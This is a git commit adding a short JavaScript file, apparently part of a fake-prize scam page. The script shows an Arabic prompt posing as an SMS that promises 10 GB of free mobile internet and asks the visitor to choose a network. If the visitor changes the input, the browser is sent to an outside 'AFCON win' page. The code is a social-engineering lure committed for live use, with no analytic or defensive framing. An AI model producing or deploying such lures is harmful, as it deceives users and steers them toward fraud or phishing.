9f7f71d4114671f1f8e7fd00f195abe991776ccb
newblog13 <sweet16guyz@gmail.com>
2026-01-18 14:58:20 +0100

    Create winner-active.js

---
+++ winner-active.js
@@ -0,0 +1,5 @@
+var password = 'حدد الشبكة'
+password=prompt('SMS: تهانينا، رقم هاتفك المحمول مؤهل للحصول على 10 جيجابايت من الإنترنت، انقر فوق "موافق" لاختيار شبكتك','حدد الشبكة');
+if (password != 'حدد الشبكة') {
+location.href='https://phivez.org/afcon-win.html';
+}
